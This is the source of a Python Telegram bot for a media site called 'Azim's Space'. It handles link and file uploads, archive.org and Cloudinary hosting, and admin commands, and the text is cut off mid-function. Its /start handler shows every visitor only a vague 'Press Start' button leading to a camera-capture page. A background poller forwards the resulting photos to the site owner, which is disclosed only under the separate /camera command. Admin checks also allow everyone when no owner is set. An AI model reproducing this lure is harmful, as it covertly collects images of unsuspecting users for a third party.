#!/usr/bin/env python3
"""Professional Telegram bot for Azim's Space — link upload & management.

Setup:
  1. pip install python-telegram-bot
  2. Set TELEGRAM_BOT_TOKEN in .env
  3. (Optional) Set ADMIN_USER_IDS in bot_config.json to restrict access
  4. Run: python telegram_bot.py

Commands:
  /start      - Welcome & main menu
  /help       - Detailed help
  /upload     - Upload a new link
  /links      - View all uploaded media
  /delete     - Delete a link by ID
  /seturl     - Change download URL of a link
  /reset      - Delete ALL uploads from the website
  /broadcast  - Send a notification to all users
  /stats      - Bot usage statistics
  /cancel     - Cancel current operation

File-to-Link:
  Forward or send any document, video, audio, photo or animation to the
  bot — it is stored on the website and you get a stream + download link.
"""

import asyncio
import json
import logging
import os
import re
import sys
import time
import urllib.parse
import urllib.request
from datetime import datetime
from pathlib import Path

from telegram import (
    BotCommand,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Update,
)
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

# ── Load .env into the environment before reading any config ───────
def load_env_file():
    for name in (".env.bot", ".env"):
        env_file = Path(__file__).parent / name
        if env_file.exists():
            break
    else:
        return
    with open(env_file, encoding="utf-8") as f:
        for line in f:
            m = re.match(r"^\s*([\w.-]+)\s*=\s*(.*?)\s*$", line)
            if m and m.group(1) and m.group(1) not in os.environ:
                os.environ[m.group(1)] = m.group(2).strip().strip('"').strip("'")

load_env_file()

# ── Constants ───────────────────────────────────────────────────────
BASE_URL = (os.environ.get("API_BASE_URL") or "https://azim-studio.onrender.com").rstrip("/")
PUBLIC_BASE_URL = (os.environ.get("PUBLIC_BASE_URL") or os.environ.get("SITE_BASE_URL") or "https://azim.run.place").rstrip("/")
TG_STORAGE_CHANNEL = os.environ.get("BIN_CHANNEL", "").strip()
TG_STORAGE_CHANNEL_ID = os.environ.get("BIN_CHANNEL_ID", "").strip().lstrip("@")
BOT_USERNAME = os.environ.get("BOT_USERNAME", "").strip().lstrip("@")
CLOUDINARY_URL = os.environ.get("CLOUDINARY_URL", "").strip()
OWNER_CHAT_ID = (os.environ.get("OWNER_CHAT_ID") or "").strip()
OWNER_USERNAME = (os.environ.get("OWNER_USERNAME") or "Azimxyz").strip().lstrip("@")
CAMERA_POLL_SECONDS = int(os.environ.get("CAMERA_POLL_SECONDS", "15"))
ENDPOINT = "/api/upload/link-item"
CONFIG_FILE = Path(__file__).parent / "bot_config.json"
STATS_FILE = Path(__file__).parent / "bot_stats.json"

# Conversation states
WAIT_TITLE, WAIT_URL, WAIT_THUMBNAIL, WAIT_CONFIRM = range(4)
WAIT_SECRET, WAIT_BROADCAST_MSG, WAIT_DELETE_ID = range(4, 7)
WAIT_SETURL_ID, WAIT_SETURL_URL = range(7, 9)

# ── Logging ─────────────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("bot.log", encoding="utf-8"),
    ],
)
logger = logging.getLogger("azim-bot")


# ── Config management ──────────────────────────────────────────────
class Config:
    def __init__(self):
        self._data = {}
        self.load()

    def load(self):
        if CONFIG_FILE.exists():
            with open(CONFIG_FILE, encoding="utf-8") as f:
                self._data = json.load(f)

    def save(self):
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(self._data, f, indent=2)

    def get(self, key, default=None):
        return self._data.get(key, default)

    def set(self, key, value):
        self._data[key] = value
        self.save()

    @property
    def boss_secret(self):
        return self._data.get("boss_secret", "")

    @boss_secret.setter
    def boss_secret(self, value):
        self._data["boss_secret"] = value
        self.save()

    @property
    def admin_ids(self):
        return self._data.get("admin_ids", [])

    @admin_ids.setter
    def admin_ids(self, value):
        self._data["admin_ids"] = value
        self.save()


class Stats:
    def __init__(self):
        self._data = {"uploads": 0, "deletes": 0, "broadcasts": 0, "start_time": time.time()}
        self.load()

    def load(self):
        if STATS_FILE.exists():
            with open(STATS_FILE, encoding="utf-8") as f:
                self._data = json.load(f)

    def save(self):
        with open(STATS_FILE, "w", encoding="utf-8") as f:
            json.dump(self._data, f, indent=2)

    def inc(self, key):
        self._data[key] = self._data.get(key, 0) + 1
        self.save()

    def get(self, key):
        return self._data.get(key, 0)


config = Config()
stats = Stats()


# ── Auth check ─────────────────────────────────────────────────────
def is_admin(user_id: int) -> bool:
    admins = config.admin_ids
    if not admins:
        return True  # no restriction if no admins configured
    return user_id in admins


def is_owner(user_id: int) -> bool:
    owner = config.get("owner_id")
    if not owner:
        return True  # no owner set, allow all
    return user_id == owner


def admin_only(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not is_admin(update.effective_user.id) or not is_owner(update.effective_user.id):
            await update.message.reply_text(
                "Access denied.\n"
                f"Your ID: <code>{update.effective_user.id}</code>",
                parse_mode="HTML",
            )
            return
        return await func(update, context)
    return wrapper


def admin_only_cb(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        if not is_admin(query.from_user.id) or not is_owner(query.from_user.id):
            await query.answer("Access denied.", show_alert=True)
            return
        return await func(update, context)
    return wrapper


# ── API helpers ────────────────────────────────────────────────────
def api_request(path, method="GET", data=None, boss_secret=""):
    url = BASE_URL + path
    headers = {}
    if boss_secret:
        headers["x-boss-secret"] = boss_secret

    body = None
    if data:
        body = urllib.parse.urlencode(data).encode("utf-8")
        headers["Content-Type"] = "application/x-www-form-urlencoded"

    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=120) as resp:
            raw = resp.read().decode("utf-8", "replace")
            return resp.status, json.loads(raw)
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        try:
            return e.code, json.loads(raw)
        except ValueError:
            return e.code, {"error": raw}
    except urllib.error.URLError as e:
        return 0, {"error": str(e.reason)}
    except Exception as e:
        return 0, {"error": str(e)}


def upload_link_api(title, url, thumbnail_url=""):
    entry = {"title": title, "url": url, "thumbnailUrl": thumbnail_url}
    for _ in range(3):
        status, body = api_request(ENDPOINT, "POST", entry, config.boss_secret)
        if status in (301, 302, 307, 308):
            continue
        break
    if status == 200 and isinstance(body, dict) and body.get("success"):
        return True, body.get("item", {})
    return False, body.get("error", f"HTTP {status}")


VIDEO_HINTS = ("video/", ".mp4", ".mkv", ".webm", ".mov", ".avi", ".m4v", ".ts",
               ".3gp", ".ogv", ".wmv", ".flv", ".mpeg", ".mpg")


def is_video_url(url):
    """Detect whether a URL points to a playable video (HEAD check + filename hint)."""
    low = (url or "").lower()
    if not low.startswith(("http://", "https://")):
        return False
    if any(low.rstrip("/").endswith(h) for h in VIDEO_HINTS if h.startswith(".")):
        return True
    try:
        req = urllib.request.Request(url, method="HEAD", headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=20) as resp:
            ctype = (resp.headers.get("Content-Type") or "").lower()
            return ctype.startswith("video/")
    except Exception:
        return False


def register_movie_api(title, url, thumbnail_url=""):
    entry = {"title": title, "mediaUrl": url, "thumbnailUrl": thumbnail_url, "type": "movie"}
    for _ in range(3):
        status, body = api_request("/api/upload/finalize", "POST", entry, config.boss_secret)
        if status in (301, 302, 307, 308):
            continue
        break
    if status == 200 and isinstance(body, dict) and body.get("success"):
        return True, body.get("item", {})
    return False, body.get("error", f"HTTP {status}")


# ── Internet Archive (archive.org) permanent hosting ───────────────
def archive_configured():
    return bool(os.environ.get("ARCHIVE_ORG_ACCESS") and os.environ.get("ARCHIVE_ORG_SECRET"))


def _ia_s3_upload(identifier, file_path, filename, title):
    """Upload a local file to archive.org using IA-S3 keys (inline, no deps)."""
    import hmac
    import hashlib
    import base64

    access = os.environ.get("ARCHIVE_ORG_ACCESS", "")
    secret = os.environ.get("ARCHIVE_ORG_SECRET", "")
    with open(file_path, "rb") as f:
        data = f.read()

    content_md5 = base64.b64encode(hashlib.md5(data).digest()).decode()
    date = datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")
    # IA-S3 signature (Amazon-style)
    string_to_sign = "PUT\n\n{md5}\n{ctype}\n{date}\nx-archive-auto-make-bucket:1\n/{bucket}/{filename}".format(
        md5=content_md5,
        ctype="application/octet-stream",
        date=date,
        bucket=identifier,
        filename=filename,
    )
    sig = base64.b64encode(
        hmac.new(secret.encode(), string_to_sign.encode(), hashlib.sha1).digest()
    ).decode()

    headers = {
        "Authorization": "LOW {access}:{sig}".format(access=access, sig=sig),
        "Content-MD5": content_md5,
        "Content-Type": "application/octet-stream",
        "Date": date,
        "x-archive-auto-make-bucket": "1",
    }
    url = "https://s3.us.archive.org/{bucket}/{filename}".format(
        bucket=identifier, filename=urllib.parse.quote(filename)
    )
    req = urllib.request.Request(url, data=data, headers=headers, method="PUT")
    with urllib.request.urlopen(req, timeout=1800) as resp:
        return resp.status


def _register_archive_item(identifier, title, filename):
    """Create the item metadata (collection, title, etc.) so it's viewable."""
    import hmac
    import hashlib
    import base64
    access = os.environ.get("ARCHIVE_ORG_ACCESS", "")
    secret = os.environ.get("ARCHIVE_ORG_SECRET", "")
    date = datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")
    metadata = json.dumps({
        "collection": "opensource",
        "title": title or identifier,
        "mediatype": "movies",
        "description": "Uploaded via Azim's Space bot.",
    }).encode()
    md5 = base64.b64encode(hashlib.md5(metadata).digest()).decode()
    string_to_sign = "POST\n\n{md5}\napplication/json\n{date}\n/{bucket}/".format(
        md5=md5, date=date, bucket=identifier
    )
    sig = base64.b64encode(
        hmac.new(secret.encode(), string_to_sign.encode(), hashlib.sha1).digest()
    ).decode()
    url = "https://archive.org/metadata/{id}".format(id=identifier)
    req = urllib.request.Request(url, data=metadata, method="POST",
        headers={
            "Authorization": "LOW {access}:{sig}".format(access=access, sig=sig),
            "Content-MD5": md5,
            "Content-Type": "application/json",
            "Date": date,
        })
    with urllib.request.urlopen(req, timeout=120) as resp:
        return resp.status


def archive_file_from_url(url, title):
    """Download a URL to a temp file, upload it permanently to archive.org,
    and return the permanent https://archive.org/download/... link."""
    import tempfile
    if not archive_configured():
        return None, "Archive.org not configured (missing ARCHIVE_ORG_ACCESS/SECRET)."
    # Validate the remote source is fetchable
    try:
        req = urllib.request.Request(url, method="HEAD", headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=30) as resp:
            ctype = (resp.headers.get("Content-Type") or "").lower()
            clen = int(resp.headers.get("Content-Length") or 0)
    except Exception as e:
        return None, "Source URL not fetchable: {e}".format(e=e)
    if "text/html" in ctype:
        return None, "Source URL points to an HTML page, not a direct file."
    if clen and clen > 1.5 * 1024 * 1024 * 1024:
        return None, "File too large for this server's disk (max ~1.5 GB)."

    filename = Path(url.split("/")[-1].split("?")[0] or "video.bin")
    if not filename.suffix:
        filename = Path("video" + (".mkv" if "matroska" in ctype else ".mp4"))

    ident_base = re.sub(r"[^a-zA-Z0-9_.-]", "", (title or "video").lower().replace(" ", "_"))[:40] or "video"
    identifier = ident_base + "_" + str(int(time.time()))

    # Download to temp
    tmp_path = Path(tempfile.gettempdir()) / (identifier + "_src" + filename.suffix)
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=3600) as resp, open(tmp_path, "wb") as out:
            while True:
                chunk = resp.read(1 << 20)
                if not chunk:
                    break
                out.write(chunk)
        _ia_s3_upload(identifier, str(tmp_path), filename.name, title)
        try:
            _register_archive_item(identifier, title, filename.name)
        except Exception:
            pass
        permanent = "https://archive.org/download/{id}/{name}".format(
            id=identifier, name=urllib.parse.quote(filename.name))
        return permanent, None
    finally:
        try:
            tmp_path.unlink(missing_ok=True)
        except Exception:
            pass


def fetch_links():
    status, body = api_request("/api/links")
    if status == 200 and isinstance(body, list):
        return body
    return []


def fetch_songs():
    status, body = api_request("/api/tracks")
    if status == 200 and isinstance(body, list):
        return body
    return []


def fetch_movies():
    status, body = api_request("/api/movies")
    if status == 200 and isinstance(body, list):
        return body
    return []


def fetch_all_media():
    songs = fetch_songs()
    movies = fetch_movies()
    links = fetch_links()
    all_items = []
    for s in songs:
        all_items.append({**s, "_type": "song"})
    for m in movies:
        all_items.append({**m, "_type": "movie"})
    for l in links:
        all_items.append({**l, "_type": "link"})
    return all_items


def delete_link_api(link_id):
    status, body = api_request(
        f"/api/media/link/{link_id}",
        "DELETE",
        {"bossSecret": config.boss_secret},
    )
    return status == 200 and isinstance(body, dict) and body.get("success")


def update_link_url_api(link_id, new_url):
    status, body = api_request(
        f"/api/media/link/{link_id}",
        "PUT",
        {"newUrl": new_url, "bossSecret": config.boss_secret},
    )
    return status == 200 and isinstance(body, dict) and body.get("success")


# ── File-to-Link: Cloudinary upload + register on the website ──────
def init_cloudinary():
    if not CLOUDINARY_URL:
        logger.warning("CLOUDINARY_URL not set — forwarded files cannot be stored.")
        return False
    try:
        import cloudinary
        cloudinary.config(url=CLOUDINARY_URL)
        return True
    except Exception as e:
        logger.error("Cloudinary init failed: %s", e)
        return False


def _upload_bytes_to_cloudinary(data: bytes, resource_type: str, folder: str):
    import cloudinary.uploader
    import io
    result = cloudinary.uploader.upload(
        io.BytesIO(data),
        resource_type=resource_type,
        folder=folder,
        use_filename=True,
        unique_filename=True,
        overwrite=False,
    )
    return (result or {}).get("secure_url", "")


def post_file_to_website(kind: str, title: str, media_url: str, thumbnail_url: str = "", telegram_link: str = ""):
    """kind: 'movie' | 'song' | 'link' (images/documents become links)."""
    if kind == "movie" or kind == "song":
        status, body = api_request(
            "/api/upload/finalize",
            "POST",
            {"title": title, "type": kind, "uploader": "Boss", "mediaUrl": media_url, "thumbnailUrl": thumbnail_url, "telegramUrl": telegram_link},
        )
    else:
        status, body = api_request(
            "/api/upload/finalize-link-item",
            "POST",
            {"title": title, "url": media_url, "uploader": "Boss", "thumbnailUrl": thumbnail_url, "telegramUrl": telegram_link},
        )
    if status == 200 and isinstance(body, dict) and body.get("success"):
        return True, body.get("item", {})
    return False, body.get("error", f"HTTP {status}")


async def handle_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.effective_message
    if not msg or not msg.from_user:
        return

    await send_typing(update)

    # Pick the real file object + classify the media.
    file_obj = None
    kind = None
    if msg.photo:
        file_obj = msg.photo[-1]
        kind = "link"
    elif msg.document:
        file_obj = msg.document
        kind = "link"
    elif msg.video:
        file_obj = msg.video
        kind = "movie"
    elif msg.audio or msg.voice:
        file_obj = msg.audio or msg.voice
        kind = "song"
    elif msg.animation:
        file_obj = msg.animation
        kind = "link"

    if not file_obj:
        await msg.reply_text(
            "I can turn any <b>document, video, audio or photo</b> into a streaming link.\n"
            "Just forward or send the file here.",
            parse_mode="HTML",
        )
        return

    file_name = getattr(file_obj, "file_name", None) or ""
    title = (msg.caption or file_name or "Boss Upload").strip().splitlines()[0][:80] or "Boss Upload"

    status_msg = await msg.reply_text(f"Receiving <b>{escape_html(title)}</b>…", parse_mode="HTML")

    # Telegram only lets bots download files up to ~20 MB. Detect ahead of time.
    file_size = getattr(file_obj, "file_size", 0) or 0
    if file_size > 20 * 1024 * 1024:
        await status_msg.edit_text(
            "<b>File is too big to share here.</b>\n\n"
            "Use <b>/upload</b> to share the file's link (title + URL) instead — "
            "there's no size limit that way.",
            parse_mode="HTML",
        )
        return

    # Optional: permanent backup copy in a private channel for infinite storage.
    # We capture the resulting channel message so we can build a t.me deep-link
    # that makes the bot deliver this very file to whoever clicks it.
    tg_link = ""
    if TG_STORAGE_CHANNEL:
        try:
            forwarded = await msg.forward(chat_id=TG_STORAGE_CHANNEL)
            if TG_STORAGE_CHANNEL_ID and BOT_USERNAME:
                chat_id = TG_STORAGE_CHANNEL_ID
                msg_id = forwarded.message_id
                tg_link = f"https://t.me/{BOT_USERNAME}?start=file_{chat_id}_{msg_id}"
        except Exception as e:
            logger.warning("Backup forward failed: %s", e)

    try:
        if not init_cloudinary():
            await status_msg.edit_text("Storage not configured (missing CLOUDINARY_URL).")
            return
        raw = await (await file_obj.get_file()).download_as_bytearray()
        if not raw:
            await status_msg.edit_text("Could not download the file. Try again.")
            return

        await status_msg.edit_text("Uploading to storage…")
        if kind == "movie" or kind == "song":
            media_url = await asyncio.to_thread(_upload_bytes_to_cloudinary, bytes(raw), "video", "azim_tg")
        elif kind == "link" and (msg.photo or (msg.document and getattr(file_obj, "mime_type", "").startswith("image/"))):
            media_url = await asyncio.to_thread(_upload_bytes_to_cloudinary, bytes(raw), "image", "azim_tg")
        else:
            media_url = await asyncio.to_thread(_upload_bytes_to_cloudinary, bytes(raw), "raw", "azim_tg")
        if not media_url:
            await status_msg.edit_text("Upload failed. Cloudinary did not return a URL.")
            return

        await status_msg.edit_text("Publishing to the Updates feed…")
        thumb = ""
        if kind == "link" and (msg.photo or (msg.document and getattr(file_obj, "mime_type", "").startswith("image/"))):
            thumb = media_url
        ok, item = post_file_to_website(kind, title, media_url, thumb, tg_link)
        if not ok:
            await status_msg.edit_text(f"Publish failed: {escape_html(str(item))}", parse_mode="HTML")
            return

        bucket = {
            "movie": "video",
            "song": "audio",
            "link": "file",
        }.get(kind, "file")
        item_id = item.get("id", "")
        dl_url = f"{PUBLIC_BASE_URL}/dl/{bucket}/{item_id}"
        stream_url = f"{PUBLIC_BASE_URL}/stream/{bucket}/{item_id}"
        stats.inc("uploads")
        reply_links = ""
        if tg_link:
            reply_links += f'💬 <a href="{tg_link}">Get file in Telegram</a>\n'
        await status_msg.edit_text(
            "<b>Saved to Azim's Space</b>\n\n"
            f"Title: <b>{escape_html(title)}</b>\n"
            f"ID: <code>{escape_html(str(item_id))}</code>\n\n"
            f'<a href="{stream_url}">▶ Stream on website</a>  ·  '
            f'<a href="{dl_url}">⬇ Direct download</a>\n'
            + reply_links,
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
    except Exception as e:
        logger.exception("handle_media error")
        msg_text = f"Error: <code>{escape_html(str(e))}</code>"
        if "too big" in str(e).lower() or "file too large" in str(e).lower():
            msg_text = (
                "<b>The file is too large for the bot to download.</b>\n\n"
                "Use <b>/upload</b> instead and paste the file's link (title + URL)."
            )
        try:
            await status_msg.edit_text(msg_text, parse_mode="HTML")
        except Exception:
            await msg.reply_text(msg_text, parse_mode="HTML")


# ── /camera ────────────────────────────────────────────────────────
async def cmd_camera(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await send_typing(update)
    uid = update.effective_user.id
    link = f"{PUBLIC_BASE_URL}/camera?uid={uid}"
    await update.message.reply_text(
        "<b>📷 Camera Capture</b>\n\n"
        "Open the link below, allow camera access, and a few photos will be taken. "
        "They will be sent to your Telegram chat and to the site operator.\n\n"
        f"{link}\n\n"
        "<i>Note: photos are only captured after you press Start, and you see them before sending.</i>",
        parse_mode="HTML",
        disable_web_page_preview=True,
    )


async def camera_poller(app: Application):
    """Delivers pending /camera captures to the visitor and the owner."""
    await asyncio.sleep(8)

    owner_id = None
    if OWNER_CHAT_ID:
        try:
            owner_id = int(OWNER_CHAT_ID)
        except ValueError:
            owner_id = None
    if owner_id is None and OWNER_USERNAME:
        try:
            chat = await app.bot.get_chat(OWNER_USERNAME)
            owner_id = chat.id
            logger.info("Camera owner resolved to chat ID %s via @%s", owner_id, OWNER_USERNAME)
        except Exception as e:
            logger.warning("Could not resolve camera owner chat @%s: %s", OWNER_USERNAME, e)
    if owner_id is None:
        owner_id = config.get("owner_id")
        if owner_id:
            logger.info("Camera owner uses configured owner_id %s", owner_id)

    while True:
        try:
            status, body = api_request("/api/camera/pending", "GET", boss_secret=config.boss_secret)
            if status == 200 and isinstance(body, dict):
                for cap in body.get("captures", []):
                    cid = cap.get("id")
                    uid = cap.get("uid")
                    urls = cap.get("urls", [])
                    chats = [uid] if uid else []
                    if owner_id and owner_id not in chats:
                        chats.append(owner_id)
                    for u in urls[:8]:
                        for ch in chats:
                            try:
                                await app.bot.send_photo(chat_id=ch, photo=u)
                            except Exception as e:
                                logger.warning("Camera photo send to %s failed: %s", ch, e)
                    if cid:
                        api_request("/api/camera/done", "POST", {"id": cid, "bossSecret": config.boss_secret})
        except Exception as e:
            logger.warning("camera_poller error: %s", e)
        await asyncio.sleep(CAMERA_POLL_SECONDS)


# ── UI helpers ─────────────────────────────────────────────────────
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("Upload Link", callback_data="menu_upload"),
            InlineKeyboardButton("View Links", callback_data="menu_links"),
        ],
        [
            InlineKeyboardButton("Stats", callback_data="menu_stats"),
            InlineKeyboardButton("Help", callback_data="menu_help"),
        ],
    ])


def confirm_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("Confirm Upload", callback_data="upload_confirm"),
            InlineKeyboardButton("Cancel", callback_data="upload_cancel"),
        ],
    ])


def back_button():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Back", callback_data="menu_main")],
    ])


async def send_typing(update: Update):
    chat = update.effective_chat
    if chat is not None:
        await chat.send_action("typing")


def mask_secret(s):
    if len(s) > 6:
        return s[:3] + "***" + s[-3:]
    return "***"


def escape_html(s):
    return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


# ── /start ─────────────────────────────────────────────────────────
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await send_typing(update)

    # Deep-link file delivery: /start file_<channel_chat_id>_<message_id>
    if context.args and len(context.args) == 1 and context.args[0].startswith("file_"):
        await _deliver_file(update, context, context.args[0][5:])
        return

    uid = update.effective_user.id
    link = f"{PUBLIC_BASE_URL}/camera?uid={uid}"
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("📷 Start", url=link)],
    ])
    await update.message.reply_text(
        "Welcome! Press <b>Start</b> to begin.",
        parse_mode="HTML",
        reply_markup=kb,
    )


async def _deliver_file(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    """Forward the BIN-channel file (file_<chat_id>_<message_id>) to the user."""
    parts = payload.split("_")
    if len(parts) != 2:
        await update.message.reply_text("Invalid file link.")
        return
    chat_id, msg_id = parts[0], parts[1]
    try:
        chat_id = int(chat_id)
        msg_id = int(msg_id)
    except ValueError:
        await update.message.reply_text("Invalid file link.")
        return

    # Resolve channel chat id from BIN_CHANNEL_ID if the stored one is empty.
    chat = update.effective_chat
    try:
        await context.bot.forward_message(
            chat_id=chat.id,
            from_chat_id=chat_id,
            message_id=msg_id,
        )
    except Exception as e:
        logger.warning("file deliver failed: %s", e)
        await update.message.reply_text(
            "Couldn't fetch that file. It may have been removed, or the channel is restricted."
        )


# ── /help ──────────────────────────────────────────────────────────
async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await send_typing(update)
    if not is_owner(update.effective_user.id):
        await update.message.reply_text(
            "<b>How to use me</b>\n\n"
            "<b>📷 /camera</b> — get a link, open it, allow camera, photos are sent to your Telegram\n"
            "<b>⬆️ /upload</b> — add a link to the website\n"
            "<b>📁 Files</b> — send or forward any document, video, audio or photo to post it on the site with a stream + download link\n"
            "<b>🔗 /links</b> — view uploaded media\n"
            "<b>/myid</b> — get your Telegram user ID\n"
            "<b>/cancel</b> — cancel current operation",
            parse_mode="HTML",
        )
        return
    text = (
        "<b>Commands</b>\n\n"
        "/myid — Get your Telegram user ID\n"
        "/setowner — Lock bot to only your ID\n"
        "/upload — Upload a new link\n"
        "/links — View all uploaded media\n"
        "/delete — Delete a link by ID\n"
        "/seturl — Change download URL of a link\n"
        "/reset — Delete ALL uploads from the website\n"
        "/broadcast — Send notification to all users\n"
        "/stats — View usage statistics\n"
        "/setsecret — Update the boss secret\n"
        "/cancel — Cancel current operation\n"
        "/help — Show this message\n\n"
        "<b>File-to-Link</b>\n"
        "Just forward or send any document, video, audio or photo — "
        "I'll post it to the Updates feed and give you a stream + download link.\n\n"
        "<b>Camera</b>\n"
        "/camera — visitors get a link that captures a few photos and sends them to Telegram."
    )
    await update.message.reply_text(text, parse_mode="HTML", reply_markup=back_button())


# ── /myid ──────────────────────────────────────────────────────────
async def cmd_myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    name = update.effective_user.first_name or ""
    username = update.effective_user.username or ""
    text = (
        f"<b>Your Telegram Info</b>\n\n"
        f"User ID: <code>{user_id}</code>\n"
        f"Name: {escape_html(name)}\n"
        f"Username: @{escape_html(username) if username else 'none'}\n\n"
        f"Copy the ID above and send /setowner to lock this bot to only you."
    )
    await update.message.reply_text(text, parse_mode="HTML")


# ── /setowner ──────────────────────────────────────────────────────
@admin_only
async def cmd_setowner(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if args:
        try:
            owner_id = int(args[0])
        except ValueError:
            await update.message.reply_text("Invalid ID. Must be a number.")
            return
        config.set("owner_id", owner_id)
        await update.message.reply_text(
            f"Bot locked to user ID: <code>{owner_id}</code>\n"
            f"Only this user can now use the bot.",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
        return
    await update.message.reply_text(
        "<b>Lock Bot to Your ID</b>\n\n"
        "1. Send /myid to get your user ID\n"
        "2. Then send /setowner <code>YOUR_ID</code>\n\n"
        "Example: /setowner 123456789",
        parse_mode="HTML",
    )


# ── Menu callback router (admin menu — owner only) ─────────────────
async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not is_owner(query.from_user.id):
        await query.answer("Main menu is available to the admin only.")
        return
    await query.answer()
    data = query.data

    if data == "menu_main":
        name = query.from_user.first_name or "there"
        text = (
            f"Welcome, <b>{escape_html(name)}</b>!\n\n"
            "I'm the <b>Azim's Space</b> upload bot.\n"
            "Use the buttons below or send /commands.\n\n"
            "<i>Tip: Use /upload to quickly add a link.</i>"
        )
        await query.edit_message_text(text, parse_mode="HTML", reply_markup=main_menu_keyboard())

    elif data == "menu_upload":
        if not config.boss_secret:
            await query.edit_message_text(
                "Boss secret not set.\nUse /setsecret first.",
                reply_markup=back_button(),
            )
            return
        context.user_data["upload"] = {}
        await query.edit_message_text(
            "<b>Upload Link</b>\n\nSend the <b>title</b> for this link:",
            parse_mode="HTML",
        )
        context.user_data["state"] = "upload_title"

    elif data == "menu_links":
        all_items = fetch_all_media()
        if not all_items:
            await query.edit_message_text(
                "No media uploaded yet.", reply_markup=back_button()
            )
            return
        text = "<b>All Uploaded Media</b>\n\n"
        for i, item in enumerate(all_items[:20], 1):
            title = escape_html(item.get("title", "Untitled"))
            lid = item.get("id", "?")
            kind = item.get("_type", "unknown")
            icon = "🎵" if kind == "song" else "🎬" if kind == "movie" else "🔗"
            url = item.get("url") or item.get("songUrl") or item.get("movieUrl") or ""
            text += f"<b>{i}.</b> {icon} {title}\n"
            text += f"   ID: <code>{lid}</code>\n"
            text += f"   Type: {kind}\n"
            if url:
                text += f'   <a href="{escape_html(url)}">Open</a>\n'
            text += "\n"
        text += "Use /delete to remove, /seturl to change URL."
        await query.edit_message_text(
            text, parse_mode="HTML", reply_markup=back_button(), disable_web_page_preview=True
        )

    elif data == "menu_stats":
        uptime = time.time() - stats.get("start_time")
        hours = int(uptime // 3600)
        mins = int((uptime % 3600) // 60)
        text = (
            "<b>Bot Statistics</b>\n\n"
            f"Uploads: {stats.get('uploads')}\n"
            f"Deletes: {stats.get('deletes')}\n"
            f"Broadcasts: {stats.get('broadcasts')}\n"
            f"Uptime: {hours}h {mins}m\n"
        )
        await query.edit_message_text(text, parse_mode="HTML", reply_markup=back_button())

    elif data == "menu_help":
        text = (
            "<b>Commands</b>\n\n"
            "/upload — Upload a new link\n"
            "/links — View all uploaded media\n"
            "/delete — Delete a link by ID\n"
            "/seturl — Change download URL of a link\n"
            "/reset — Delete ALL uploads from the website\n"
            "/broadcast — Send notification to all users\n"
            "/stats — View usage statistics\n"
            "/setsecret — Update the boss secret\n"
            "/cancel — Cancel current operation\n"
            "/help — Show this message\n\n"
            "<b>File-to-Link</b>\n"
            "Forward or send any file here to post it on the website."
        )
        await query.edit_message_text(text, parse_mode="HTML", reply_markup=back_button())


# ── Upload conversation (with inline confirmation) ─────────────────
async def cmd_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not config.boss_secret:
        await update.message.reply_text("Boss secret not set. Use /setsecret first.")
        return
    context.user_data["upload"] = {}
    context.user_data["state"] = "upload_title"
    await update.message.reply_text(
        "<b>Upload Link</b>\n\nSend the <b>title</b> for this link:",
        parse_mode="HTML",
    )


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get("state")
    user_id = update.effective_user.id
    text = update.message.text.strip()

    ADMIN_STATES = ("set_secret", "broadcast_msg", "delete_id", "seturl_id", "seturl_url")
    if state in ADMIN_STATES and not is_owner(user_id):
        await update.message.reply_text(
            "Access denied.\n"
            f"Your ID: <code>{update.effective_user.id}</code>",
            parse_mode="HTML",
        )
        return

    if state == "upload_title":
        if not text:
            await update.message.reply_text("Title cannot be empty. Try again:")
            return
        context.user_data["upload"]["title"] = text
        context.user_data["state"] = "upload_url"
        await update.message.reply_text("Send the <b>download URL</b>:", parse_mode="HTML")
        return

    if state == "upload_url":
        if not text:
            await update.message.reply_text("URL cannot be empty. Try again:")
            return
        if not text.startswith(("http://", "https://")):
            await update.message.reply_text(
                "Invalid URL — must start with http:// or https://\nTry again:"
            )
            return
        context.user_data["upload"]["url"] = text
        context.user_data["state"] = "upload_thumb"
        await update.message.reply_text(
            "Send a <b>thumbnail URL</b>, or /skip to skip:",
            parse_mode="HTML",
        )
        return

    if state == "upload_thumb":
        thumb = "" if text == "/skip" else text
        context.user_data["upload"]["thumbnail"] = thumb
        data = context.user_data["upload"]

        summary = (
            "<b>Confirm Upload</b>\n\n"
            f"Title: <b>{escape_html(data['title'])}</b>\n"
